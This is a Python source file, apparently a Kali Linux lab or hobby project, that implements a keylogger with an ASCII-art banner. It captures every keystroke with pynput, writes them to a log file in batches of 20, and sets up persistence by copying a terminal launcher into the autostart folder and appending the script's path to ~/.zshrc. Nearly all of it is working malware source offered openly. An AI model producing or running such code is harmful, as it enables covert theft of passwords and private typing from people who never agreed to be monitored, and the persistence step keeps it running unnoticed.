#Import Key and Listener module
import subprocess
import sys
import shutil

subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])

from pynput.keyboard import Key, Listener


print('''________                 __  .__              __                 __    
\______ \   ____ _____ _/  |_|  |__   _______/  |________  ____ |  | __\_____  \ 
 |    |  \_/ __ \\__  \\   __\  |  \ /  ___/\   __\_  __ \/  _ \|  |/ /  _(__  < 
 |    `   \  ___/ / __ \|  | |   Y  \\___ \  |  |  |  | \(  <_> )    <  /       \
/_______  /\___  >____  /__| |___|  /____  > |__|  |__|   \____/|__|_ \/______  /
        \/     \/     \/          \/     \/                          \/       \/''')

count = 0
keys = []
#Without this Error will coccur if we try to call a boolean Value as a function
my_bool = False

# print the key strokes to the log file
#when key is pressed
def on_press(key):
  global keys, count

  keys.append(key)
  count += 1
  #Sanity check for key recording
  #Key placed in string
  print("{0} pressed".format(key))

#Every 20 keys typed by user txt file is updated
#Can be any number
  if count >= 20:
    count = 0
    write_file(keys)
    #Resets keys
    keys = []
    
    
#write to a file
#text file can be named how you see fit
def write_file(key):
  with open("key_log.txt", "w") as f:
    for key in keys:
      f.write(str(key))

#When  key is released
#Breaks loop if we hit the escape key
def on_release(key):
  if key==Key.esc:
    return my_bool
      
def persistence():
    # Copy qterminal.desktop to autostart folder
    terminal_path = "/usr/share/applications/qterminal.desktop"
    autostart_path = "/home/kali/.config/autostart"
    shutil.copy(terminal_path, autostart_path)

    file_location = "/home/kali/.zshrc"
    command = "/home/kali/Downloads/keylog2.py"
    
    # Open .zshrc file and check for entry for script
    with open(file_location) as file:
        file = file.readlines()
        # Strip newline character from last line of file and check if it matches command
        entry = file[-1].strip()
        if entry != command:
            append_command()
            print("Line created.")
        else:
            print("Line already exists.")

def append_command():
    # Add entry into .zshrc file
    file_location = "/home/kali/.zshrc"
    command = "/home/kali/Downloads/keylog2.py"

    with open(file_location, "a") as file:
        file.write(command)

persistence()
    
#Will continously loop through until broken
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
